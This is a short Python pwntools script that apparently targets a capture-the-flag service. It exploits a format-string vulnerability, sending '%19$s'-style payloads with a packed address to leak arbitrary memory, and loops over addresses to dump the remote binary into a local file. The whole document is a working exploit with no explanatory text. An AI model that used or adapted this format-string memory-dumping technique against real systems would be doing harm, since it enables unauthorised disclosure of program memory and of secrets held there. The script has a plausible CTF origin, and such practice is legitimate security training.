from pwn import *

def conn():
    return remote('pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one', 1234)

def dump(adr,frmt='p'):
    r.recvuntil('StrRemoveLastSymbols')
    r.recvuntil('\n')
    r.sendline('3')
    r.recvuntil(':')
    r.recvuntil('\n')

    leak_part = "|%19${}|".format(frmt)
    out = leak_part.ljust(4*10,"A")+"EOF_"+p32(adr)
    r.sendline(out)
    r.sendline('0')
    r.recvuntil('Result:')
    return r.recvuntil("|A")[:-2].split("|")[1]

start_addr = 0x8048750

while True:
    try:
        fd = open("dumped_file","a")
        r = conn()
        data = dump(start_addr,'s')
        print "|0x%08x|%s|" % (start_addr,data)
        if data == "(null)" or data == "":
            fd.write("\x00")
            start_addr += 1
        else:
            fd.write(data+"\x00")
            start_addr += len(data)+1
        fd.close()
        r.close()
    except Exception as e:
        print e
        print "[!] execption"
        break